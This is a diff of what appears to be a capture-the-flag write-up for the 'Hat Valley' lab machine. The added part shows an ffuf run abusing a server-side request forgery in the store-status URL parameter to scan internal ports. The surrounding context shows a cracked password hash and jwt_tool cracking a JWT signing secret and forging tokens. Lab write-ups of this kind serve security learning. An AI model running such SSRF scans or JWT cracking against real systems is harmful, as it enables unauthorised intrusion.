@@ -73,6 +73,47 @@ etag: W/"307-yT9RDkJOX+lsRRlC/J2nEu9d6Is"
 
 e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1	sha256	chris123
 
+```console
+└─$ ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt  -u http://hat-valley.htb/api/store-status?url=%20http://localhost:FUZZ/%20 -v -fs 0  -c                 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://hat-valley.htb/api/store-status?url=%20http://localhost:FUZZ/%20
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 0
+________________________________________________
+
+[Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 100ms]
+| URL | http://hat-valley.htb/api/store-status?url=%20http://localhost:0080/%20
+    * FUZZ: 0080
+
+[Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 82ms]
+| URL | http://hat-valley.htb/api/store-status?url=%20http://localhost:3002/%20
+    * FUZZ: 3002
+
+[Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 64ms]
+| URL | http://hat-valley.htb/api/store-status?url=%20http://localhost:8080/%20
+    * FUZZ: 8080
+
+:: Progress: [10000/10000] :: Job [1/1] :: 546 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
+```
+
+
+```console
 └─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -d /usr/share/wordlists/rockyou.txt -C 
 
         \   \        \         \          \                    \ 
@@ -103,7 +144,7 @@ Original JWT:
 [+] 123beany123 is the CORRECT key!
 You can tamper/fuzz the token contents (-T/-I) and sign it using:
 python3 jwt_tool.py [options here] -S hs256 -p "123beany123"
-
+```
 ```
 └─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -S hs256 -p "123beany123" -T
 
